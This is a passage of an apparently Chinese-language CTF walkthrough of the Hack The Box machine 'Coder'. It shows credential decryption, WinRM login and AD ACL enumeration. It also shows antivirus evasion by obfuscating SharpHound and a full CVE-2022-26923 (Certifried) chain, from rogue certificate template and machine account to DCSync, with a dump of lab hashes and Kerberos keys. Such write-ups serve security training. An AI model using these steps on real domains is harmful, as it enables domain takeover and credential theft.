class="string">&quot;.\key.key&quot;</span></span><br><span class="line"><span class="variable">$pass</span> = (<span class="built_in">Get-Content</span> <span class="string">&quot;.\enc.txt&quot;</span> | <span class="built_in">ConvertTo-SecureString</span> <span class="literal">-Key</span> <span class="variable">$key</span>)</span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Management.Automation.PSCredential</span><br><span class="line">(<span class="string">&quot;coder\e.black&quot;</span>,<span class="variable">$pass</span>)</span><br><span class="line">(<span class="built_in">New-Object</span> PSCredential <span class="variable">$cred</span>).GetNetworkCredential().Password</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者 $cred.GetNetWorkCredential().Password</span></span><br></pre></td></tr></table></figure><p>如下图所示，我们获得了<code>e.black</code>域用户的密码<code>ypOSJXPqlDOxxbQSfEERy300</code></p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250404163002.png" alt="微信截图_20250404163002"></p><p>利用winrm登录获取用户flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.207 -u e.black -p ypOSJXPqlDOxxbQSfEERy300  </span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250404163505.png" alt="微信截图_20250404163505"></p><h2 id="域内权限提升"><a href="#域内权限提升" class="headerlink" title="域内权限提升"></a>域内权限提升</h2><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>我们看一下<code>e.black</code>所在组</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups</span><br></pre></td></tr></table></figure><p>注意到下面红框中的<code>PKI Admins</code> ，我们需要看一下这个组的具体说明</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250404164214.png" alt="微信截图_20250404164214"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;PKI Admins&quot;</span></span><br></pre></td></tr></table></figure><p>这是一个大发现，<code>e.black</code>所在<code>PKI Admins</code>组可以管理ADCS服务，为我们滥用ADCS指明了道路</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250404164406.png" alt="微信截图_20250404164406"></p><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>和之前打过的<code>HTB-Mist</code>类似，我们上传旧版本SharpHound时会被Windows Defender拦截，这里因为我们有了域内账户的票据可以直接尝试利用<code>bloodhound-python</code>收集数据，或者直接上传最新版本的SharpHound也不会被杀，我在官方wp上看到了另一种方法—<strong>混淆SharpHound绕过Windows Denfender</strong></p><p>利用<a href="https://github.com/h4wkst3r/InvisibilityCloak">InvisibilityCloak</a>这个项目，执行下面的命令进行混淆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./InvisibilityCloak.py -d ../SharpHound -m reverse -n <span class="string">&quot;ObfuscatedHound&quot;</span></span><br></pre></td></tr></table></figure><p>然后回到SharpHound目录，并按照仓库README.md文件中的指引，使用 <strong>dotnet</strong> 构建可执行文件</p><p>注：这里可能会出现<code>Build failed</code>，但是不影响可执行文件的构建</p><p>这里为了方便我还是使用<code>bloodhound-python</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -c All -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -ns 10.10.11.207 -d coder.htb -dc dc01.coder.htb --zip</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250404172937.png" alt="微信截图_20250404172937"></p><p>在BloodHound中分析，标记所有已经拥有的节点</p><p>首先先看一下<code>e.black</code>所有所在组</p><p><code>s.blade</code>所在组</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250404174300.png" alt="微信截图_20250404174300"></p><p>它在两个刚才没有枚举到的组中，分别是<code>BUILDAGENT MGMT</code>和<code>SOFTWARE DEVELOPERS</code>，我们看一下这两个组的说明</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250425191000.png" alt="微信截图_20250425191000"></p><p>两个组都与TeamCity有关</p><p><code>SVC_TEAMCITY</code>是一个普通的域账户，没有什么特别的地方</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250425191228.png" alt="微信截图_20250425191228"></p><h3 id="手工AD枚举"><a href="#手工AD枚举" class="headerlink" title="手工AD枚举"></a>手工AD枚举</h3><p>首先先枚举一下此域中的组织单元</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADOrganizationalUnit</span> <span class="literal">-filter</span> * | <span class="built_in">select</span> Name</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250425192022.png" alt="微信截图_20250425192022"></p><p>我们在上面知道域内存在<code>BUILDAGENT MGMT</code>组，同时组织单元作为一种逻辑容器可以用来组织和管理 AD 中对象（用户、计算机、组、子 OU等），管理员可以将 OU 的权限赋予某个组，我们根据组名可以猜测<code>BUILDAGENT MGMT</code>组对<code>BuildAgents</code>OU存在一些控制权限，但是在我们的bloodhound上并没有显示出来。</p><p>在进一步枚举之前我们获取一下OU的<code>DistinguishedName</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADOrganizationalUnit</span> <span class="literal">-filter</span> * | <span class="built_in">select</span> Name, DistinguishedName</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250425203000.png" alt="微信截图_20250425203000"></p><p>接下来列出<code>BuildAgents</code>OU的ACL，查看谁对这个OU具有某种特定的权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&quot;AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb&quot;</span>).access</span><br></pre></td></tr></table></figure><blockquote><p><code>Get-Acl</code>：获取指定对象的访问控制列表（ACL），用于查看谁拥有何种权限。</p><p><code>&quot;AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb&quot;</code>：域中OU对象的路径，前缀 <code>AD:</code> 表示使用的是Active Directory PS 驱动器</p><p><code>.access</code>：获取该对象的访问控制列表ACL中的所有访问控制项ACE</p></blockquote><p>这里存在大量输出，我们这里仅对我们控制的组的权限感兴趣，我们利用<code>where</code>进行一下简单的过滤</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&quot;AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb&quot;</span>).access | <span class="built_in">where</span> IdentityReference <span class="operator">-eq</span> <span class="string">&quot;coder\PKI Admins&quot;</span></span><br><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&quot;AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb&quot;</span>).access | <span class="built_in">where</span> IdentityReference <span class="operator">-eq</span> <span class="string">&quot;coder\Software Developers&quot;</span></span><br><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&quot;AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb&quot;</span>).access | <span class="built_in">where</span> IdentityReference <span class="operator">-eq</span> <span class="string">&quot;coder\BuildAgent Mgmt&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>where</code>：用于对对象集合进行条件过滤</p><p><code>IdentityReference</code>：表示权限项是属于哪个用户或组的</p></blockquote><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250425204411.png" alt="微信截图_20250425204411"></p><p>我们看一下两个<code>ObjectType</code>我们具体可以操作什么东西</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectType: bf967a86<span class="literal">-0de6-11d0-a285-00aa003049e2</span>    ActiveDirectoryRights : CreateChild, DeleteChild</span><br><span class="line">ObjectType: <span class="number">72</span>e39547<span class="literal">-7b18-11d1-adef-00c04fd8d5cd</span>    ActiveDirectoryRights : Self, ReadProperty, WriteProperty</span><br></pre></td></tr></table></figure><p><a href="https://learn.microsoft.com/en-us/windows/win32/adschema/c-computer">bf967a86-0de6-11d0-a285-00aa003049e2</a>这个类代表域中的计算机帐户，我们在域中具有对他的<code>CreateChild</code>权限即在OU下创建对象的权限（如用户、组、计算机等），以及<code>DeleteChild</code>删除该 OU 下的对象的权限</p><p><a href="https://learn.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name">72e39547-7b18-11d1-adef-00c04fd8d5cd</a>这个代表<strong>验证写入权限以启用与计算机名称和域名兼容的 DNS 主机名属性的设置</strong>，我们具有<code>ReadProperty</code>即可以读取对象的某些属性，<code>WriteProperty</code>即可以修改对象的属性，<code>self</code>允许用户自己修改自己的属性</p><h3 id="CVE-2022–26923"><a href="#CVE-2022–26923" class="headerlink" title="CVE-2022–26923"></a>CVE-2022–26923</h3><p>其实到这里我们需要利用的ADCS漏洞就已经很明显了，即我在前几个文章中分析的<a href="https://chromos2me.github.io/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">CVE-2022–26923域内提权漏洞</a>，最早在Oliver Lyak的文章<a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923)</a>提出，接下来我们进行利用</p><p>注：此靶机发布时CVE-2022–26923已经被修复，但是漏洞分析博客中都会指出在<code>msPKI-EnrollmentFlag</code>属性中设置了新的<code>CT_FLAG_NO_SECURITY_EXTENSION (0x80000)</code>标志的证书模板将不会嵌入新的 <code>szOID_NTDS_CA_SECURITY_EXT OID</code>这个用于缓解CVE-2022–26923域内提权漏洞的标志，因此我们仍然可以利用CVE-2022–26923。因为我们能够控制<code>PKI Admins</code>组，我们可以为自己创造恶意模板供我们利用CVE-2022–26923，只需要通过设置恶意模板的CT_FLAG_NO_SECURITY_EXTENSION 参数为 524288（16进制为 0x80000）</p><p>现在我们需要在我们的靶机上克隆一个证书模板进行修改，为了方便我们的操作，我们可以利用<a href="https://github.com/GoateePFE/ADCSTemplate">ADCSTemplate</a>这个powershell模块帮助我们导出、导入、删除、授权和发布AD域证书模板</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/GoateePFE/ADCSTemplate.git</span><br></pre></td></tr></table></figure><p>然后利用evil-winrm将其上传到我们的靶机上</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload ../RedTeam/ADCSTemplate/ .</span><br></pre></td></tr></table></figure><p>接下来导入powershell脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import-module</span> .\ADCSTemplate.psm1</span><br></pre></td></tr></table></figure><p>列出当前所有的模板</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADCSTemplate</span> | <span class="built_in">Format-List</span> DisplayName</span><br><span class="line"></span><br><span class="line">DisplayName : User</span><br><span class="line">DisplayName : User Signature Only</span><br><span class="line">DisplayName : Smartcard User</span><br><span class="line">DisplayName : Authenticated Session</span><br><span class="line">DisplayName : Smartcard Logon</span><br><span class="line">DisplayName : Basic EFS</span><br><span class="line">DisplayName : Administrator</span><br><span class="line">DisplayName : EFS Recovery Agent</span><br><span class="line">DisplayName : Code Signing</span><br><span class="line">DisplayName : Trust List Signing</span><br><span class="line">DisplayName : Enrollment Agent</span><br><span class="line">DisplayName : Exchange Enrollment Agent (Offline request)</span><br><span class="line">DisplayName : Enrollment Agent (Computer)</span><br><span class="line">DisplayName : Computer</span><br><span class="line">DisplayName : Domain Controller</span><br><span class="line">DisplayName : Web Server</span><br><span class="line">DisplayName : Root Certification Authority</span><br><span class="line">DisplayName : Subordinate Certification Authority</span><br><span class="line">DisplayName : IPSec</span><br><span class="line">DisplayName : IPSec (Offline request)</span><br><span class="line">DisplayName : Router (Offline request)</span><br><span class="line">DisplayName : CEP Encryption</span><br><span class="line">DisplayName : Exchange User</span><br><span class="line">DisplayName : Exchange Signature Only</span><br><span class="line">DisplayName : Cross Certification Authority</span><br><span class="line">DisplayName : CA Exchange</span><br><span class="line">DisplayName : Key Recovery Agent</span><br><span class="line">DisplayName : Domain Controller Authentication</span><br><span class="line">DisplayName : Directory Email Replication</span><br><span class="line">DisplayName : Workstation Authentication</span><br><span class="line">DisplayName : RAS and IAS Server</span><br><span class="line">DisplayName : OCSP Response Signing</span><br><span class="line">DisplayName : Kerberos Authentication</span><br><span class="line">DisplayName : Coder<span class="literal">-WebServer</span></span><br></pre></td></tr></table></figure><p>导出其中名为<code>Computer</code>的证书模板作为我们的样板，保存为JSON文件供我们之后进行修改</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Export-ADCSTemplate</span> <span class="literal">-displayname</span> Computer &gt; computer.json</span><br></pre></td></tr></table></figure><p>我们将生成的JSON对象读取到一个变量中，并将前文提到的 <code>msPKI-Enrollment-Flag</code> 属性设置为0x80000。然后，我们将修改后的 JSON 数据重新保存到 <code>computer.json</code> 文件中。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="built_in">get-content</span> computer.json <span class="literal">-raw</span> | <span class="built_in">ConvertFrom-json</span></span><br><span class="line"><span class="variable">$a</span>.<span class="string">&#x27;msPKI-Enrollment-Flag&#x27;</span> = <span class="number">0</span>x80000</span><br><span class="line"><span class="variable">$a</span> | <span class="built_in">ConvertTo-Json</span> | <span class="built_in">Set-Content</span> computer.json</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427124810.png" alt="微信截图_20250427124810"></p><p>接下来利用<code>computer.json</code>创建新的ADCS模板</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ADCSTemplate</span> <span class="literal">-displayname</span> pwned <span class="literal">-Publish</span> <span class="literal">-JSON</span> (<span class="built_in">gc</span> computer.json <span class="literal">-raw</span>)</span><br></pre></td></tr></table></figure><p>接下来利用<code>s.blade</code>去创建机器账户（即恶意计算机对象），利用impacket的addcomputer脚本即可完成，但是脚本中默认不允许用户控制 DNS 名称，我们将对脚本进行修改，先复制一份出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/doc/python3-impacket/examples/addcomputer.py addcomputer.py</span><br><span class="line"><span class="built_in">cat</span> addcomputer.py | grep -n dns </span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427135402.png" alt="微信截图_20250427135402"></p><p>我们只需要将上图中所示的computerHostname修改为DC01即可</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427135633.png" alt="微信截图_20250427135633"></p><p>然后利用修改后的脚本添加计算机对象，注意这里是<code>s.blade</code>账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py <span class="string">&#x27;coder.htb/s.blade:AmcwNO60Zg3vca3o0HDrTC6D&#x27;</span> -method LDAPS -computer-name <span class="string">&quot;pwned_pc&quot;</span> -computer-pass <span class="string">&quot;Passw0rd&quot;</span> -computer-group OU=BuildAgents,OU=Development,DC=coder,DC=htb</span><br></pre></td></tr></table></figure><p>注：这里的<code>-computer-group</code>需要是我们可以控制的<code>OU=BuildAgents,OU=Development,DC=coder,DC=htb</code></p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427140616.png" alt="微信截图_20250427140616"></p><p>将新建的计算机对象注册到我们的恶意证书模板中</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADCSTemplateACL</span> <span class="literal">-displayname</span> pwned <span class="literal">-type</span> allow <span class="literal">-identity</span> <span class="string">&#x27;coder\pwned_pc$&#x27;</span> <span class="literal">-enroll</span></span><br></pre></td></tr></table></figure><blockquote><p><code>Set-ADCSTemplateACL</code>：修改一个证书模板的访问控制列表 </p><p><code>-type allow</code>：设置允许权限</p><p><code>-enroll</code>：授权这个计算计算机账户可以申请证书</p></blockquote><p>注：如果注册的时候出现类似下面的错误说明机器账户并没有成功添加进域中，只要多添加几次就行了，在域中会有如下提示，这是因为靶机上存在机器账户清理脚本，会定期清理我们创建的机器账户</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427152503.png" alt="微信截图_20250427152503"></p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427152357.png" alt="微信截图_20250427152357"></p><p>为我们的机器账户申请恶意证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad req -u pwned_pc\<span class="variable">$@dc01</span>.coder.htb -p <span class="string">&#x27;Passw0rd&#x27;</span> -ca CODER-DC01-CA -template pwned -target dc01.coder.htb  </span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427154103.png" alt="微信截图_20250427154103"></p><p>获取域控哈希，这一步因为需要与域控进行Kerberos认证，所以需要伪造一下时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;21289 seconds&#x27;</span> certipy-ad auth -pfx dc01.pfx   </span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427154626.png" alt="微信截图_20250427154626"></p><p>有了域控哈希，接下来打一个DCSYNC就可以下班了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump coder.htb/dc01\<span class="variable">$@dc01</span>.coder.htb -hashes aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94 -dc-ip dc01.coder.htb </span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(chromosome㉿kali)-[~/HTB/Coder]</span><br><span class="line">└─$ impacket-secretsdump coder.htb/dc01\<span class="variable">$@dc01</span>.coder.htb -hashes aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94 -dc-ip dc01.coder.htb            </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:26000ce1f6ca4029ec5d3a95631e797c:::</span><br><span class="line">coder.htb\e.black:1106:aad3b435b51404eeaad3b435b51404ee:e1b96bbb66a073787a3310b5a956200d:::</span><br><span class="line">coder.htb\c.cage:1107:aad3b435b51404eeaad3b435b51404ee:3ab6e9f70dbc0d19623be042d224b993:::</span><br><span class="line">coder.htb\j.briggs:1108:aad3b435b51404eeaad3b435b51404ee:e38976c0b20e3e41e9c62da792115a33:::</span><br><span class="line">coder.htb\l.kang:1109:aad3b435b51404eeaad3b435b51404ee:b8aba4878e4777864b292731ac88b4cd:::</span><br><span class="line">coder.htb\s.blade:1110:aad3b435b51404eeaad3b435b51404ee:4e4a79beed7d042627d0a7b10f5d008a:::</span><br><span class="line">coder.htb\svc_teamcity:5101:aad3b435b51404eeaad3b435b51404ee:4c5a6890e09834a6834dbf7a76bf20cb:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:86a6a038ff6058c56a74e2e35008f6b037b8e7bca8c75cc5ee4495f77d0be71e</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:6d63b0853502cbbc8c8e40ad8fe88fa3</span><br><span class="line">Administrator:des-cbc-md5:37feabd9d9575785</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:aeb517a1efec8b79479cb1432e734555bc1039bcbd77bcdc39234b37199a70d3</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:2bab4af978e4cee0b58fa1d377d35981</span><br><span class="line">krbtgt:des-cbc-md5:100489b5839798cb</span><br><span class="line">coder.htb\e.black:aes256-cts-hmac-sha1-96:ccb6c47af9a05d91e7610fe396cd8ffcc0e51279a2eee253fab1fb40536a5a85</span><br><span class="line">coder.htb\e.black:aes128-cts-hmac-sha1-96:650ad0d49ab4bcff325a7f2a846d433f</span><br><span class="line">coder.htb\e.black:des-cbc-md5:89290da2c2cd16ec</span><br><span class="line">coder.htb\c.cage:aes256-cts-hmac-sha1-96:ea9cc2144c3106e9325b1ddda16c27c644d9f9b7e95098581ceba19c75d9b296</span><br><span class="line">coder.htb\c.cage:aes128-cts-hmac-sha1-96:2cff13848c9e8d07339a6ab41bf72088</span><br><span class="line">coder.htb\c.cage:des-cbc-md5:fd6d578510df1af1</span><br><span class="line">coder.htb\j.briggs:aes256-cts-hmac-sha1-96:ec3ac8b99094903a3ca006a725dc0867666347efb4baf04d8b2f8b0305ab65ee</span><br><span class="line">coder.htb\j.briggs:aes128-cts-hmac-sha1-96:39050d78545c40645fa889c13200f8f7</span><br><span class="line">coder.htb\j.briggs:des-cbc-md5:7f5286d35def8f15</span><br><span class="line">coder.htb\l.kang:aes256-cts-hmac-sha1-96:d7eb03d2695638c4ba423cd88e22dcdd7c0f6da996e5d6ed3af6c6d7e6c56661</span><br><span class="line">coder.htb\l.kang:aes128-cts-hmac-sha1-96:25ad8331aa0fa2b26e220040b9e55937</span><br><span class="line">coder.htb\l.kang:des-cbc-md5:571a573e61ced640</span><br><span class="line">coder.htb\s.blade:aes256-cts-hmac-sha1-96:ceeab374597121113f3bdee3aab1fed0522506909b2f1ec24dfe36045eb3c252</span><br><span class="line">coder.htb\s.blade:aes128-cts-hmac-sha1-96:69f4cada02748fba948e4c15460add9e</span><br><span class="line">coder.htb\s.blade:des-cbc-md5:26eca8ad9deaada2</span><br><span class="line">coder.htb\svc_teamcity:aes256-cts-hmac-sha1-96:b6c7ed72b4434a89c56295df6b42ca68937702dda15f90f23423e8712abce030</span><br><span class="line">coder.htb\svc_teamcity:aes128-cts-hmac-sha1-96:d6604e2fadb40bbf71708e7b9c9734a7</span><br><span class="line">coder.htb\svc_teamcity:des-cbc-md5:264ab5645ed91c86</span><br><span class="line">DC01$:aes256-cts-hmac-sha1-96:a43b686fdd5f2e576ad834c5b1d4327dd5bdbd3ec579677343a2c6c43c8f1740</span><br><span class="line">DC01$:aes128-cts-hmac-sha1-96:22192237a3cb399c19a6b469dcd1cba8</span><br><span class="line">DC01$:des-cbc-md5:cb9758c162ba4943</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><p>最后利用管理员哈希获取root flag</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427155644.png" alt="微信截图_20250427155644"></p><h2 id="靶机拓展"><a href="#靶机拓展" class="headerlink" title="靶机拓展"></a>靶机拓展</h2><p>虽然靶机到这里flag已经拿完了，但是这个靶机还有很多值得我们去发掘的地方，难道真的只能使用CVE-2022–26923吗？</p><p>上面我们知道我么具有<code>e.black</code>属于<code>PKI Admins</code>，我们有权导入任何易受攻击的模板，我们先枚举一下当前域中的所有证书模板</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -target coder.htb -text</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427164557.png" alt="微信截图_20250427164557"></p><p>第20个模板是我们刚才利用的Computer模板</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">20</span><br><span class="line">  Template Name                       : Machine</span><br><span class="line">  Display Name                        : Computer</span><br><span class="line">  Certificate Authorities             : coder-DC01-CA</span><br><span class="line">  Enabled                             : True</span><br><span class="line">  Client Authentication               : True</span><br><span class="line">  Enrollment Agent                    : False</span><br><span class="line">  Any Purpose                         : False</span><br><span class="line">  Enrollee Supplies Subject           : False</span><br><span class="line">  Certificate Name Flag               : SubjectRequireDnsAsCn</span><br><span class="line"><span class="code">                                        SubjectAltRequireDns</span></span><br><span class="line"><span class="code">  Enrollment Flag                     : AutoEnrollment</span></span><br><span class="line"><span class="code">  Private Key Flag                    : AttestNone</span></span><br><span class="line"><span class="code">  Extended Key Usage                  : Client Authentication</span></span><br><span class="line"><span class="code">                                        Server Authentication</span></span><br><span class="line"><span class="code">  Requires Manager Approval           : False</span></span><br><span class="line"><span class="code">  Requires Key Archival               : False</span></span><br><span class="line"><span class="code">  Authorized Signatures Required      : 0</span></span><br><span class="line"><span class="code">  Validity Period                     : 1 year</span></span><br><span class="line"><span class="code">  Renewal Period                      : 6 weeks</span></span><br><span class="line"><span class="code">  Minimum RSA Key Length              : 2048</span></span><br><span class="line"><span class="code">  Permissions</span></span><br><span class="line"><span class="code">    Enrollment Permissions</span></span><br><span class="line"><span class="code">      Enrollment Rights               : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                        CODER.HTB\Domain Computers</span></span><br><span class="line"><span class="code">                                        CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">    Object Control Permissions</span></span><br><span class="line"><span class="code">      Owner                           : CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">      Write Owner Principals          : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                        CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">      Write Dacl Principals           : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                        CODER.HTB\Enterprise 